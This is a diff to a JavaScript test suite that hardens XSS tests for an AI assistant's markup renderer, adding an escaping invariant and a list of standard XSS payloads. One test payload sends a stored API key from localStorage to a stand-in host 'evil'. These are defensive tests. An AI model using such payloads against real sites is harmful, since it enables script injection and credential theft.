@@ -92,29 +92,79 @@ function makeStorage() {
 
 /* ═══ XSS: the AI assistant renderer ═══════════════════════════════════════ */
 
+/**
+ * The invariant the whole module rests on.
+ *
+ * Strip the tags the renderer is allowed to emit, and nothing that could open a tag
+ * may remain. Asserting on individual payload substrings is weaker: it passes for
+ * the payloads you thought of, and says nothing about the next one.
+ */
+const assertNoInjectedMarkup = (html) => {
+  const allowed = /<\/?(?:strong|code|br)\b[^>]*>/g;
+  const remainder = html.replace(allowed, '');
+  assert.ok(!remainder.includes('<'), `unescaped "<" survived in: ${html}`);
+  assert.ok(!remainder.includes('>'), `unescaped ">" survived in: ${html}`);
+};
+
 describe('renderInlineMarkup — XSS prevention', () => {
   test('neutralises an img/onerror payload', () => {
     const out = renderInlineMarkup('<img src=x onerror=fetch("//evil/"+localStorage["gbcoder_e2b_key"])>');
     assert.ok(!out.includes('<img'), 'must not emit an img tag');
-    assert.ok(!out.includes('onerror='), 'must not emit an event handler');
+    // `onerror=` survives as inert visible text; what matters is that it is not an
+    // attribute, which is what the invariant below establishes.
     assert.ok(out.includes('&lt;img'), 'payload should appear escaped');
+    assert.ok(out.includes('&quot;') || !out.includes('"'), 'quotes must not survive raw');
+    assertNoInjectedMarkup(out);
   });
 
   test('neutralises a script tag', () => {
     const out = renderInlineMarkup('<script>alert(1)</script>');
     assert.ok(!out.includes('<script'), 'must not emit a script tag');
     assert.ok(out.includes('&lt;script&gt;'));
+    assertNoInjectedMarkup(out);
   });
 
   test('neutralises an iframe', () => {
     const out = renderInlineMarkup('<iframe src="javascript:alert(1)"></iframe>');
     assert.ok(!out.includes('<iframe'));
+    assertNoInjectedMarkup(out);
   });
 
   test('neutralises an svg/onload payload', () => {
     const out = renderInlineMarkup('<svg onload=alert(1)>');
     assert.ok(!out.includes('<svg'));
-    assert.ok(!out.includes('onload='));
+    assertNoInjectedMarkup(out);
+  });
+
+  test('neutralises a closing-tag breakout attempt', () => {
+    const out = renderInlineMarkup('</code><script>x</script>');
+    assertNoInjectedMarkup(out);
+  });
+
+  test('neutralises a javascript: link', () => {
+    const out = renderInlineMarkup('[x](javascript:alert(1))');
+    assertNoInjectedMarkup(out);
+  });
+
+  test('survives a battery of payloads with the invariant intact', () => {
+    const payloads = [
+      '<img src=x onerror=alert(1)>',
+      '<script>alert(1)</script>',
+      '<svg/onload=alert(1)>',
+      '<body onload=alert(1)>',
+      '"><script>alert(1)</script>',
+      "'><img src=x onerror=alert(1)>",
+      '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">',
+      '<a href="javascript:alert(1)">click</a>',
+      '<style>@import "evil"</style>',
+      '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
+      '```<img src=x onerror=alert(1)>```',
+      '`<img src=x onerror=alert(1)>`',
+      '**<img src=x onerror=alert(1)>**',
+    ];
+    for (const payload of payloads) {
+      assertNoInjectedMarkup(renderInlineMarkup(payload));
+    }
   });
 
   test('preserves bold and inline code', () => {
@@ -122,6 +172,7 @@ describe('renderInlineMarkup — XSS prevention', () => {
     assert.ok(out.includes('<strong>bold</strong>'), out);
     assert.ok(out.includes('<code'), out);
     assert.ok(out.includes('code'), out);
+    assertNoInjectedMarkup(out);
   });
 
   test('converts newlines to breaks', () => {
@@ -133,15 +184,24 @@ describe('renderInlineMarkup — XSS prevention', () => {
     assert.ok(escapeHtml('a "b" \'c\'').includes('&#39;'));
   });
 
-  test('a $& in model text is not treated as a capture reference', () => {
-    // `String.replace` with a string replacement would expand `$&` to the match.
+  test('a $& in model text is not expanded as a capture reference', () => {
+    // With a string replacement, `$&` expands to the whole match. The match here
+    // is `**$&**`, so expansion would put the asterisks into the output.
     const out = renderInlineMarkup('**$&**');
-    assert.ok(!out.includes('$&'), `expected literal $& escaped/kept, got ${out}`);
+    assert.ok(!out.includes('**'), `capture-reference expansion occurred: ${out}`);
+    assert.equal(out, '<strong>$&amp;</strong>');
+  });
+
+  test('a $1 in model text is not expanded as a capture reference', () => {
+    const out = renderInlineMarkup('`$1`');
+    assert.equal(out.includes('$1'), true, 'literal $1 must survive');
+    assertNoInjectedMarkup(out);
   });
 
   test('an escaped payload cannot re-enter as markup via the code span', () => {
     // Backticks must not let content skip escaping.
     const out = renderInlineMarkup('`<b>x</b>`');
+    assertNoInjectedMarkup(out);
     assert.ok(!out.includes('<b>x</b>'), out);
   });
 });
